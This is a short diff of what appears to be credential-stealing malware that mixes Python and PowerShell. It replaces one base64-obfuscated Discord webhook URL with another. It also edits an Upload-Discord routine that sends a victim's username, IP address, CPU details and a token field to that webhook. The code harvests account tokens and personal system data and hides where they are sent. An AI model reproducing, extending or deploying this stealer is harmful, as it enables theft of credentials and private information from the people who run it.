@@ -9,7 +9,7 @@ import base64
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MzU4MDYzOTQ3MjkxNDQ0Mi8tSDZ0NF8zalBGQmw1Q2hRV0gwTTY1ZV9mLVM2Nm5VNnNpbzVLbm9TUGVFNElKaXNhejNMdU44b1dUZm1zNFo3VHpIcg==').decode()
+WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MzU5MDk4MzY0MTYxNjQ1Ni9tWk1GZE9EbUlvb3FyeEx6LVJUalVtSjNTb29jb3N0WjVxWUNfSUxYMU9JN05qRUpFU2Y0U21zWXRVTmNiSloyYU9NTA==').decode()
 
 # mentions you when you get a hit
 PING_ME = False
@@ -78,7 +78,6 @@ if __name__ == '__main__':
     main()
     
 "
-
 cls
 
 function Upload-Discord {
@@ -137,7 +136,7 @@ Upload-Discord -text "**Token MC**: DEV..."
 Upload-Discord -text "-----------------------------**INFO-PC**---------------------------------------------"
 Upload-Discord -text "**Name**: $env:UserName"
 Upload-Discord -text "--------------"
-Upload-Discord -text "**IP**: ||$ip||"
+Upload-Discord -text "**IP**: $ip"
 Upload-Discord -text "---"
 Upload-Discord -text "**CPU**: $cpu"
 Upload-Discord -text "---"
